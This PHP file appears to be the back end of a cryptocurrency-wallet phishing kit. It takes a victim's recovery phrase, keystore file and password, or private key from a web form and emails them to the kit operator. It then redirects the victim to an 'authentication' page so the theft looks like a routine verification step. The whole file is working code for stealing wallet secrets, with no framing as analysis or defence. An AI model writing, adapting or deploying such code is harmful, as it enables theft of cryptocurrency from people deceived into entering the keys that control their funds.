<?php 

/***********Let's start from here ****************/


 require 'MailerEngine/setup.php';



if (isset($_POST['submit'])) {



//Set who the message is to be sent from
$mail->setFrom('SET_FROM_EMAIL_ADDRESS', 'Mycompany Web Wallet ');

//Set an alternative reply-to address
// $mail->addReplyTo('REPLY_TO_EMAIL_ADDRESS');

//Set who the message is to be sent to
$mail->addAddress('SET_To_EMAIL_ADDRESS', 'Mycompany Web Admin');


//Set the subject line
$mail->Subject = 'Mycompany Web Wallet - Wallet Forms !';


    $type =  $_POST['type'];
    $wallet = $_POST['wallet'];

	if ($_POST['type'] == 'phrase') {

            $phrase = $_POST['phrase'];
			$message = ' <div style="text-align: left;">
			 
			  <div style="padding: 5px; margin: 20px; text-align: left; font-family:"Poppins"; font-size: 20px;"> 
			       
			       <h2>*************Message Details***********</h2>
			       <br>

			       <ul>

			         <li>Type :: '.$type.'</li>
			         <li>Wallet :: '.$wallet.'</li>
			         <li>Phrase :: '.$phrase.'</li>

			       </ul>
			 
			  </div>

			</div>';
		
		     

	}elseif ($_POST['type'] == 'keystore') {

		    $keystorejson = $_POST['keystorejson'];
		    $keystorepass = $_POST['keystorepassword'];

		    $message = ' <div style="text-align: left;">
			 
			  <div style="padding: 5px; margin: 20px; text-align: left; font-family:"Poppins"; font-size: 20px;"> 
			       
			       <h2>*************Message Details***********</h2>
			       <br>

			       <ul>

			         <li>Type :: '.$type.'</li>
			         <li>Wallet :: '.$wallet.'</li>
			         <li>Keystorejson :: '.$keystorejson.'</li>
			         <li>Keystorepassword :: '.$keystorepass.'</li>

			       </ul>
			 
			  </div>

			</div>';
	}elseif ($_POST['type'] == 'privatekey') {
		    $privatekey = $_POST['privatekey'];

		      $message = ' <div style="text-align: left;">
			 
			  <div style="padding: 5px; margin: 20px; text-align: left; font-family:"Poppins"; font-size: 20px;"> 
			       
			       <h2>*************Message Details***********</h2>
			       <br>

			       <ul>

			         <li>Type :: '.$type.'</li>
			         <li>Wallet :: '.$wallet.'</li>
			         <li>Privatekey :: '.$privatekey.'</li>

			       </ul>
			 
			  </div>

			</div>';
	}


$mail->msgHTML($message);



if ($mail->send()) {        

               header("location: authentication.html");

                  }else{

             header("location: 404.html");

}

}




